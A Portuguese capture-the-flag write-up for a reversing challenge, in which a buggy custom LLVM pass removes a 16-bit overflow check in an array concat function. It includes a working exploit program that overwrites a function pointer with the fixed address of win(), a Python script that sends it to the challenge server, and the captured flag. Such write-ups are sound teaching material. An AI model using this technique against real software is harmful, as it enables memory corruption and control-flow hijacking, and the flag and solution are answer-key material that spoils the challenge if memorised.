# WriteUp: compiler? I barely know her!

## Descrição do Desafio

**Categoria:** reversing

**Descrição:**

> Idk what she did, but my code runs a lot faster now! select easy by entering 1

### Arquivos

| Arquivo | Descrição |
| --- | --- |
| handler.sh | Script que recebe o `.dsl`, compila com `dslc` + `clang` e executa o binário. |
| Dockerfile / docker-compose.yml | Ambiente do serviço remoto (Ubuntu 24.04, `clang-22`, porta 1337). |
| dslc | Compilador da linguagem *barely* em Python, responsável por gerar LLVM IR (`.ll`). |
| compilerIBarelyKnowHer.so | Plugin de otimização LLVM (*pass* customizado) aplicado na compilação. |
| runtime.o | Runtime em C (compilado separadamente, sem passar pelo plugin) linkado ao binário final. |
| runtime.h | Headers das funções do runtime. |
| LANGUAGE.md | Manual da linguagem *barely*. |
| flag.txt | Arquivo da flag (placeholder no handout local). |


## Passo a Passo da Solução

### 1. Análise do Ambiente

Ao extrair os arquivos fornecidos e inspecionar o `handler.sh`, é possível observar o pipeline completo de compilação e execução do código enviado:

```bash
python3 "$DSLC" prog.dsl -o prog.ll

clang -O1 \
    -fpass-plugin=./compilerIBarelyKnowHer.so \
    -fstack-protector-strong -no-pie \
    -Wl,--section-start=.winsec=0x4010000 \
    prog.ll runtime.o -o prog

```

Nesta configuração é possível notar alguns pontos importantes:

1. O código `.dsl` enviado é traduzido para **LLVM IR** pelo compilador `dslc`, otimizado pelo plugin customizado `compilerIBarelyKnowHer.so` e linkado contra o `runtime.o`.
2. O binário final é compilado com `-no-pie` (sem ASLR no código) e possui uma seção `.winsec` mapeada em endereço fixo (`0x4010000`), indicando a presença de uma função `win()` em um endereço estático e previsível.

{% hint style="info" %}

Nota: Como o compilador `dslc` foi escrito em Python puro fazendo lexer, parser e codegen diretamente para LLVM IR textual, podemos ler o código-fonte inteiro sem precisar fazer engenharia reversa no compilador.
{% endhint %}

### 2. Entendendo a Linguagem e o Compilador (`dslc`)

Analisando o `LANGUAGE.md` e o código de `dslc`, vemos que a linguagem *barely* possui apenas dois tipos: `int` (`i64`) e `array` (bloco contíguo de *slots* `i64` protegido por *bounds-check*).

O ponto crítico está na geração de código da função nativa `concat(a, b)`, que o `dslc` compila para o seguinte LLVM IR (nomes de registradores simplificados para clareza; o `dslc` usa `%tN` sequencial):

```llvm
la16 = trunc i64 %la to i16
lb16 = trunc i64 %lb to i16
s    = add i16 %la16, %lb16
o    = icmp ult i16 %s, %la16      ; overflow check de 16 bits
br i1 %o, label %bad, label %ok
bad:
  call void @rt_oob()               ; aborta com out-of-bounds
  unreachable
ok:
  cap   = zext i16 %s to i64        ; capacidade REALMENTE alocada
  total = add i64 %la, %lb          ; comprimento lógico (64-bit, sem truncar)
  c = rt_array_alloc(cap)
  rt_array_setlen(c, total)          ; len(c) = total, não cap!

```

Nesta lógica é possível notar uma dessincronização potencial:

1. O compilador trunca os comprimentos de `a` e `b` para **16 bits** apenas para calcular a capacidade física do novo array (`cap`), protegendo a soma com uma verificação de *unsigned overflow* (`icmp ult`).
2. Porém, o comprimento lógico utilizado nas verificações de índice (`c[i]`) é armazenado como a soma completa em **64 bits** (`total`).
3. Caso o *pass* de otimização remova a verificação de overflow (como veremos a seguir), o programa aloca um espaço físico mínimo, mas registra um comprimento lógico gigante.

### 3. Análise do Pass de Otimização (`compilerIBarelyKnowHer.so`)

Abrindo o plugin `compilerIBarelyKnowHer.so` em um disassembler (o arquivo contém informações de debug, facilitando a leitura), encontramos a função central `trySimplify(ICmpInst*)`:

```cpp
Value *trySimplify(ICmpInst *I) {
    Value *L = I->getOperand(0), *R = I->getOperand(1);
    auto Pred = I->getPredicate();

    auto find = [&](Value *A, Value *B) -> Value* {
        auto *OBO = dyn_cast<OverflowingBinaryOperator>(A);
        if (!OBO || OBO->getOpcode() != Instruction::Add) return nullptr;
        if (OBO->getOperand(0) == B || OBO->getOperand(1) == B) return OBO;
        return nullptr;
    };

    Value *Match = nullptr;
    if (Pred == ICmpInst::ICMP_ULT) Match = find(L, R);
    else if (Pred == ICmpInst::ICMP_UGT) Match = find(R, L);

    if (Match) {
        if (cast<OverflowingBinaryOperator>(Match)->hasNoUnsignedWrap())
            return ConstantInt::getFalse(I->getType());
        else
            return ConstantInt::getFalse(I->getType());  // <-- BUG: mesmo resultado nos dois ramos!
    }
    return nullptr;
}

```

O *pass* identifica o padrão clássico de detecção de overflow (`s = a + b; if (s < a) overflow()`) para otimizá-lo. O erro está no bloco condicional final: tanto quando a instrução possui a flag `nuw` (*No Unsigned Wrap*) quanto quando **não possui**, a função retorna `ConstantInt::getFalse`.

Com isso, o *pass* substitui a comparação `icmp ult` por `false` em tempo de compilação, eliminando a verificação de overflow do `concat()`. O branch para `rt_oob()` torna-se código morto e é removido pelo compilador, permitindo o *integer wrap-around* de 16 bits sem nenhuma proteção.

### 4. Análise do Runtime (`runtime.o`)

Inspecionando o `runtime.o`, identificamos como a memória e o fluxo de encerramento funcionam:

* **`rt_array_alloc(n)`:** Utiliza um *bump allocator* (`arena_alloc`) sobre uma região `mmap` de 256 MB. Como não há metadados de *heap* tradicional, cada alocação fica posicionada imediatamente após a anterior, alinhada em 16 bytes.
* **`register(f)`:** Na primeira chamada, aloca um *dispatch slot* de 16 bytes (`[ponteiro de função][tag 0x1234]`) na mesma arena.
* **`rt_finish()`:** Executado automaticamente ao final da `main`, lê o ponteiro armazenado nesse *slot* e executa um `jmp` diretamente para ele.
* **`win()`:** Posicionada na seção `.winsec` (`0x4010000`), abre o arquivo `flag.txt` e imprime seu conteúdo na saída padrão.

### 5. Construindo o Exploit

Para explorar a dessincronização entre o tamanho físico e o lógico, criamos dois arrays com tamanhos `1` e `65535`:

* **Cálculo em 16 bits:** `la16 = 1`, `lb16 = 65535` → `s = 0` (*wrap-around*), resultando em `cap = 0`.
* **Cálculo em 64 bits:** `total = 1 + 65535 = 65536`.

A chamada `rt_array_alloc(0)` aloca apenas o cabeçalho do array (arredondado para 16 bytes pelo alinhamento do bump allocator) sem reservar nenhum slot de dado real, enquanto `rt_array_setlen(c, 65536)` libera o acesso lógico até o índice `65535`.

Chamando `register(dummy)` logo após criar `c`, o *bump allocator* posiciona o *dispatch slot* de 16 bytes imediatamente após o bloco de `c` — exatamente no endereço `c_base + 16`, que corresponde ao índice `c[1]`. Assim, atribuir `c[1] = 0x4010000` sobrescreve o ponteiro da função registrada com o endereço fixo de `win()`.

### 6. Payload 

O programa em *barely* para explorar a falha fica assim:

```rust
fn dummy() {
    return 0;
}

let a = array(1);
let b = array(65535);
let c = concat(a, b);

register(dummy);

c[1] = 0x4010000;

print(1337);

```

Como o servidor remoto apresenta um menu inicial (`1) easy` / `2) hard`) antes de ler o código terminado por `__EOF__`, executamos o envio com o seguinte script em Python:

```python
#!/usr/bin/env python3
import socket, time

HOST = "0.cloud.chals.io"
PORT = 24814

PAYLOAD = b"""fn dummy() {
    return 0;
}

let a = array(1);
let b = array(65535);
let c = concat(a, b);

register(dummy);

c[1] = 0x4010000;

print(1337);
__EOF__
"""

def recv_until_quiet(s, timeout=3):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

s = socket.create_connection((HOST, PORT))
print(recv_until_quiet(s).decode(errors="replace"))

s.sendall(b"1\n")
time.sleep(0.5)
print(recv_until_quiet(s).decode(errors="replace"))

s.sendall(PAYLOAD)
time.sleep(2)
print(recv_until_quiet(s, timeout=10).decode(errors="replace"))
s.close()

```

### 7. Execução e Obtenção da Flag

Executando o script contra o servidor remoto, o ponteiro de `register(dummy)` é sobrescrito via `c[1]` e o `rt_finish()` redireciona a execução para `win()` em `0x4010000`:

```text
== h4ckc0n :: compiler I barely know her ==
  1) easy
  2) hard
choice>
== send your .dsl program, then a line containing only __EOF__ ==

== running ==
1337
win() called! flag: d4rk{s1gned_0r_Uns1gn3d??_676767}c0de

== exit 0 ==

```

### Flag

`d4rk{s1gned_0r_Uns1gn3d??_676767}c0de`

## Autor da WriteUp

[Membro de Exploitation - Jenni-Lopes](https://github.com/Jenni-Lopes)
